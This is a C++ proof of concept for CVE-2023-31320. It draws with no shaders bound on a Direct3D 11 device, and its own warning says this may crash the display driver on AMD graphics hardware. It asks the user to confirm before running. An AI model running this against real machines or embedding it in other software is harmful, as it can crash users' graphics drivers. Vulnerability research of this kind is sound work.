#include <d3d11.h>
#include <d3dcompiler.h>
#include <wrl.h>
#include <iostream>
#include <mutex>
#include <condition_variable>

#ifdef _DEBUG
#define DEBUG
#endif

using namespace Microsoft::WRL;

HWND hWnd = NULL;

const float triangleVertices[] = {
	 0.0f,  0.5f,  0.0f,
	 0.5f, -0.5f,  0.0f,
	-0.5f, -0.5f,  0.0f,
};

const char vertexShaderCode[] = "float4 VSMain(in float4 Position : Position) : SV_Position { return Position; }";
// const char pixelShaderCode[] = "float4 PSMain(in float4 Position : SV_Position) : SV_Target { return float4(1.0, 1.0, 1.0, 1.0); }";

std::wstring AsWString(ComPtr<ID3DBlob> blob) {
	std::wstring str;
	size_t size;

	str.resize(strnlen_s((const char *)blob->GetBufferPointer(), blob->GetBufferSize() - 1));
	mbstowcs_s(&size, &str[0], str.size() + 1, (const char *)blob->GetBufferPointer(), blob->GetBufferSize() - 1);

	return str;
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	switch (msg) {
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}

	return DefWindowProcW(hWnd, msg, wParam, lParam);
}

int wmain() {
	HRESULT hRes;

	std::wcout << L"[*] Creating window" << std::endl;

	WNDCLASSEXW wc   = { 0 };
	wc.cbSize        = sizeof(WNDCLASSEXW);
	wc.lpfnWndProc   = WindowProc;
	wc.hInstance     = GetModuleHandleW(nullptr);
	wc.lpszClassName = L"CVE-2023-31320";

	RegisterClassExW(&wc);
	hWnd = CreateWindowExW(0, L"CVE-2023-31320", L"", 0, 0, 0, 0, 0, nullptr, nullptr, GetModuleHandleW(nullptr), nullptr);

	if (!hWnd) {
		std::wcerr << L"\033[1;91m[x] Failed to create window! GetLastError return code: " << GetLastError() << L"\033[0m" << std::endl;
		return 1;
	}

	std::wcout << L"[*] Creating Direct3D 11 device and swap chain" << std::endl;
	ComPtr<IDXGISwapChain> swapChain;
	ComPtr<ID3D11Device> device;
	ComPtr<ID3D11DeviceContext> ctx;

	{
		DXGI_SWAP_CHAIN_DESC swapChainDesc = { 0 };
		swapChainDesc.BufferCount       = 1;
		swapChainDesc.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
		swapChainDesc.BufferUsage       = DXGI_USAGE_RENDER_TARGET_OUTPUT;
		swapChainDesc.OutputWindow      = hWnd;
		swapChainDesc.SampleDesc.Count  = 1;
		swapChainDesc.SwapEffect        = DXGI_SWAP_EFFECT_DISCARD;
		swapChainDesc.Windowed          = true;
	
		uint32_t creationFlags = 0;
#ifdef DEBUG
	creationFlags |= D3D11_CREATE_DEVICE_DEBUG;
#endif

		if (FAILED(hRes = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_HARDWARE,
			nullptr, creationFlags, nullptr, 0, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, nullptr, &ctx)))
		{
			std::wcerr << L"\033[1;91m[x] Failed to create device! D3D11CreateDeviceAndSwapChain return code: " << std::hex << hRes << L"\033[0m" << std::endl;
			return 1;
		}
	}

	std::wcout << L"[*] Creating render target view" << std::endl;
	ComPtr<ID3D11Resource> backBuffer;
	ComPtr<ID3D11RenderTargetView> rtv;

	{
		swapChain->GetBuffer(0, __uuidof(ID3D11Resource), &backBuffer);
	
		if (FAILED(hRes = device->CreateRenderTargetView(*backBuffer.GetAddressOf(), NULL, &rtv))) {
			std::wcerr << L"\033[1;91m[x] Failed to create render target view! ID3D11Device*->CreateRenderTargetView return code: " << std::hex << hRes << L"\033[0m" << std::endl;
			return 1;
		}
	}

	std::wcout << L"[*] Creating vertex buffer" << std::endl;
	ComPtr<ID3D11Buffer> vertexBuffer;

	{
		D3D11_SUBRESOURCE_DATA bufferData = { 0 };
		bufferData.pSysMem = &triangleVertices;

		D3D11_BUFFER_DESC bufferDesc = { 0 };
		bufferDesc.ByteWidth = sizeof(triangleVertices);
		bufferDesc.BindFlags = D3D11_BIND_VERTEX_BUFFER;
		bufferDesc.StructureByteStride = sizeof(triangleVertices[0]);

		if (FAILED(hRes = device->CreateBuffer(&bufferDesc, &bufferData, &vertexBuffer))) {
			std::wcerr << L"\033[1;91m[x] Failed to create vertex buffer! ID3D11Device*->CreateBuffer return code: " << std::hex << hRes << L"\033[0m" << std::endl;
			return 1;
		}
	}

	std::wcout << L"[*] Compiling vertex shader" << std::endl;
	ComPtr<ID3DBlob> vertexShader;

	{
		ComPtr<ID3DBlob> errorMsgs;
		uint32_t shaderFlags = 0;
#ifdef DEBUG
		shaderFlags |= D3DCOMPILE_DEBUG | D3DCOMPILE_SKIP_OPTIMIZATION;
#endif

		if (FAILED(hRes = D3DCompile(vertexShaderCode, sizeof(vertexShaderCode), nullptr, nullptr, nullptr,
			"VSMain", "vs_5_0", shaderFlags, 0, &vertexShader, &errorMsgs)))
		{
			std::wcerr << L"\033[1;91m[x] Failed to compile vertex shader! D3DCompile return code: " << std::hex << hRes << std::endl <<
				L"Compilation error output:" << std::endl << AsWString(errorMsgs) << L"\033[0m" << std::endl;

			return 1;
		}
	}

	std::wcout << L"[*] Creating input layout" << std::endl;
	ComPtr<ID3D11InputLayout> inputLayout;

	{
		D3D11_INPUT_ELEMENT_DESC inputLayoutDesc[] = { { "Position", 0, DXGI_FORMAT_R32G32B32_FLOAT } };

		if (FAILED(hRes = device->CreateInputLayout(inputLayoutDesc, 1,
			vertexShader->GetBufferPointer(), vertexShader->GetBufferSize(), &inputLayout)))
		{
			std::wcerr << L"\033[1;91m[x] Failed to create input layout! ID3D11Device*->CreateInputLayout return code: " << std::hex << hRes << L"\033[0m" << std::endl;
			return 1;
		}
	}

	std::wcout << L"\033[1;33m[!] Are you sure you want to continue?" << std::endl <<
		L"On a device with an AMD graphics card, your display driver may crash and become unstable!" << std::endl <<
		L"(Y/N) \033[0m";

	wchar_t out = getwchar();
	if (out != L'Y' && out != L'y') {
		std::wcout << L"\033[1;92m[v] Aborting\033[0m" << std::endl;
		return 0;
	}

	std::wcout << L"[*] Sending commands to immediate context" << std::endl;
	
	{
		D3D11_VIEWPORT viewports[] = { { 0, 0, 0, 0 } };
		ID3D11RenderTargetView *const renderTargetViews[] = { *rtv.GetAddressOf() };
		ID3D11Buffer *const buffers[] = { *vertexBuffer.GetAddressOf() };
		const UINT strides[] = { sizeof(float) * 3 };
		const UINT offsets[] = { 0 };

		// Shaders unbound
		ctx->RSSetViewports(1, viewports);
		ctx->OMSetRenderTargets(1, renderTargetViews, NULL);
		ctx->IASetPrimitiveTopology(D3D11_PRIMITIVE_TOPOLOGY_TRIANGLELIST);
		ctx->IASetInputLayout(*inputLayout.GetAddressOf());
		// ctx->VSSetShader(..., nullptr, 0);
		// ctx->PSSetShader(..., nullptr, 0);
		ctx->IASetVertexBuffers(0, 1, buffers, strides, offsets);
		ctx->Draw(sizeof(triangleVertices) / strides[0], 0);
	}

	std::wcout << L"[*] Swapping buffers" << std::endl;

	swapChain->Present(0, 0);

	std::wcout << L"[*] Cleaning up" << std::endl;

	DestroyWindow(hWnd);
	UnregisterClassW(wc.lpszClassName, wc.hInstance);

	std::wcout << L"\033[1;92m[v] Finished\033[0m" << std::endl;

	return 0;
}